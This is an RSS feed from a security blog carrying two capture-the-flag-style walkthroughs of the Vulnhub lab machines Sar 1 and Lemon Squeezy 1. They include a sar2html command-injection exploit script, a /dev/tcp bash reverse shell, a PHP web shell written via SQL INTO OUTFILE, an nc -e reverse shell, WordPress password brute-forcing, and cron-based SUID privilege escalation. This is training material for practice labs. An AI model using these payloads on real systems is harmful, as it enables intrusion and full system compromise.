@@ -1,0 +1,320 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Cron on ikuamike</title>
+    <link>https://blog.ikuamike.io/tags/cron/</link>
+    <description>Recent content in Cron on ikuamike</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>© Michael Ikua</copyright>
+    <lastBuildDate>Thu, 13 May 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/cron/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Vulnhub: Sar 1</title>
+      <link>https://blog.ikuamike.io/posts/2021/sar1/</link>
+      <pubDate>Thu, 13 May 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.ikuamike.io/posts/2021/sar1/</guid>
+      <description></description>
+      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Difficulty&lt;/th&gt;
+&lt;th&gt;Release Date&lt;/th&gt;
+&lt;th&gt;Author&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Beginner&lt;/td&gt;
+&lt;td&gt;15 Feb 2020&lt;/td&gt;
+&lt;td&gt;Love&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
+&lt;p&gt;In this box there&amp;rsquo;s only one port open that is running a vulnerable version of sar2html that
+we take advantage of to get a low priv shell. For privilege escalation there was a cron job
+running as root that was running a script we could write in.&lt;/p&gt;
+&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
+&lt;p&gt;Nmap&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.107
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.000040s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65534&lt;/span&gt; closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+MAC Address: 08:00:27:48:00:F5 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
+&lt;h2 id=&#34;80-http&#34;&gt;80 (HTTP)&lt;/h2&gt;
+&lt;p&gt;Using nmap scripts we see the existence of robots.txt&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.107
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00042s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+| http-enum:
+|   /robots.txt: Robots file
+|_  /phpinfo.php: Possible information file
+|_http-server-header: Apache/2.4.29 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_http-title: Apache2 Ubuntu Default Page: It works
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From this we discover sar2HTML.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-01.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Visiting this directory I get the version of sar2html as 3.2.1.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-02.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Checking on searchsploit, a remote command execution vulnerability exists for this version.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;searchsploit sar2html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-03.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h1 id=&#34;shell-as-user&#34;&gt;Shell as user&lt;/h1&gt;
+&lt;p&gt;By executing the python script that exploits this RCE vulnerability, we are able to get a reverse shell.&lt;/p&gt;
+&lt;p&gt;script url: &lt;a href=&#34;https://www.exploit-db.com/exploits/49344&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.exploit-db.com/exploits/49344&lt;/a&gt;
+
+&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;~/Vulnhub/Sar1  python3 49344.py
+
+Enter The url =&amp;gt; http://192.168.56.107/sar2HTML/
+Command =&amp;gt; id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Command =&amp;gt; /bin/bash+-c+&#39;/bin/bash+-i+&amp;gt;%26+/dev/tcp/192.168.56.1/9000+0&amp;gt;%261&#39;
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-04.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Performing some enumeration to achieve some privilege escalation to root or lateral movement to other users
+I found a cron job running as root.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-05.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;While we can&amp;rsquo;t write to this file, the script being executed inside it is writeable.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-06.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h1 id=&#34;shell-as-root&#34;&gt;Shell as root&lt;/h1&gt;
+&lt;p&gt;By writing into write.sh using vi, we can escalate our privileges.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#!/bin/sh
+
+cp /bin/bash /var/www/html/suidbash
+chmod u+s /var/www/html/suidbash
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This will create a copy of the bash binary and add suid permissions to it.&lt;/p&gt;
+&lt;p&gt;Once the cron job executes and creates the binary we can achieve a root shell and read all the flags.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-07.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
+&lt;p&gt;Understanding the exploit script and perform the exploit manually.&lt;/p&gt;
+&lt;p&gt;To my surprise, this exploit code was created by a good friend of mine, Musyoka Ian.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Exploit Title: sar2html 3.2.1 - &amp;#39;plot&amp;#39; Remote Code Execution&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Date: 27-12-2020&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Exploit Author: Musyoka Ian&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Vendor Homepage:https://github.com/cemtan/sar2html&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Software Link: https://sourceforge.net/projects/sar2html/&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Version: 3.2.1&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Tested on: Ubuntu 18.04.1&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; requests
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; re
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; cmd &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Cmd
+
+url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter The url =&amp;gt; &amp;#34;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Terminal&lt;/span&gt;(Cmd):
+    prompt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Command =&amp;gt; &amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;default&lt;/span&gt;(self, args):
+        exploiter(args)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exploiter&lt;/span&gt;(cmd):
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; url
+    sess &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;session()
+    output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{url}/index.php?plot=;{cmd}&amp;#34;&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+        out &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; re&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;findall(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;option value=(.*?)&amp;gt;&amp;#34;&lt;/span&gt;, output&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt;:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Error!!&amp;#34;&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ouut &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; out:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;There is no defined host...&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; ouut:
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;null selected&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; ouut:
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;selected&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; ouut:
+                    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; (ouut)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; ()
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;):
+    terminal &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Terminal()
+    terminal&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cmdloop()&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;According to the script the vulnerable parameter is plot and simply takes in our command and executes it.&lt;/p&gt;
+&lt;p&gt;When interacting with the application you can select OS, when you pick one the plot parameter is used.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-08.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Here we can inject the command we want and execute shell commands. The OS option doesn&amp;rsquo;t matter, anything after
+the semi-colon &lt;code&gt;;&lt;/code&gt; will be executed. For the reverse shell command remember to url encode special chars like I did
+above&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/sar1/sar1-09.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Shoutout to Musyoka Ian, you can read his blog linked below. He does cool writeups on challenges as well.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://musyokaian.medium.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://musyokaian.medium.com/&lt;/a&gt;
+
+&lt;/p&gt;</content>
+    </item>
+    
+    <item>
+      <title>Vulnhub: Lemon Squeezy 1</title>
+      <link>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</link>
+      <pubDate>Tue, 13 Apr 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</guid>
+      <description></description>
+      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Difficulty&lt;/th&gt;
+&lt;th&gt;Release Date&lt;/th&gt;
+&lt;th&gt;Author&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Beginner&lt;/td&gt;
+&lt;td&gt;26 Apr 2020&lt;/td&gt;
+&lt;td&gt;James Hay&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
+&lt;p&gt;For this box we only get one port running a web server and we discover wordpress and phpmyadmin by directory bruteforcing.
+On the wordpress application we bruteforce credentials of the users discovered and then discover more credentials stored
+in a draft post. With this new credentials we access phpmyadmin and write to a file using an sql query. This serves
+as our initial foothold and we then escalate privileges by abusing a cron job running as root that executes a world writeable
+script.&lt;/p&gt;
+&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
+&lt;p&gt;Nmap&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.191.134
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00014s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.25 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.25 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Debian&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_http-title: Apache2 Debian Default Page: It works
+MAC Address: 00:0C:29:FF:26:DE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;VMware&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
+&lt;h2 id=&#34;80-http&#34;&gt;80 (HTTP)&lt;/h2&gt;
+&lt;p&gt;Visiting this page on the browser only serves the apache default page, confirming what nmap found in title.&lt;/p&gt;
+&lt;p&gt;After performing a directory bruteforce using ffuf we get the following directories:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;ffuf -ic -c -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://192.168.191.134/FUZZ&amp;#39;&lt;/span&gt; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Checking the /wordpress directory, we see a basic wordpress site with not much information.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Performing enumeration using wpscan, the only interesting information gathered is the usernames.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wpscan --url http://lemonsqueezy/wordpress -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-3.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Bruteforcing the credentials for each user, we discover the password of the orange user.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wpscan --url http://lemonsqueezy/wordpress -U orange -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-4.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;After logging into wordpress with the discovered credentials &lt;strong&gt;orange:ginger&lt;/strong&gt;, we find another password in drafts.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-5.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;With this password, we are able to login to phpmyadmin as the orange user.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-6.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Successful login:&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-7.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;By logging in we can abuse this access by writing a file to disk that contains php by using an sql statement.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;into&lt;/span&gt; outfile &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/var/www/html/wordpress/shell.php&amp;#34;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-8.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;We can then verify that we have successful command execution, by running the whoami command.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-9.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h1 id=&#34;shell-as-www-data&#34;&gt;Shell as www-data&lt;/h1&gt;
+&lt;p&gt;Running the below curl command we are able to get a reverse shell:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;curl &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.191.134/wordpress/shell.php?cmd=nc+-e+/bin/bash+192.168.191.1+9000+%26&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-10.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;After performing some manual local enumeration, we discover a cron job running as root.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-11.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;The script being executed in the cron job is world writeable and the www-data user can write to it.&lt;/p&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-12.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h1 id=&#34;shell-as-root&#34;&gt;Shell as root&lt;/h1&gt;
+&lt;p&gt;After changing the script to the below command we can create a bash binary with suid permissions.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;cp /bin/bash /suidbash
+chmod u+s /suidbash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-13.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;p&gt;Once the cron is executed we get the binary and can escalate to root shell and read root.txt.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;./suidbash -p
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-14.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;It seems I forgot user.txt and it is in /var/www.&lt;/li&gt;
+&lt;/ul&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-15.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;
+
+
+&lt;ul&gt;
+&lt;li&gt;We could write to the wordpress folder from phpmyadmin because it was world-writeable.&lt;/li&gt;
+&lt;/ul&gt;
+
+  &lt;img src=&#34;https://blog.ikuamike.io/img/lemonsqueezy1/lemon-16.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;</content>
+    </item>
+    
+  </channel>
+</rss>
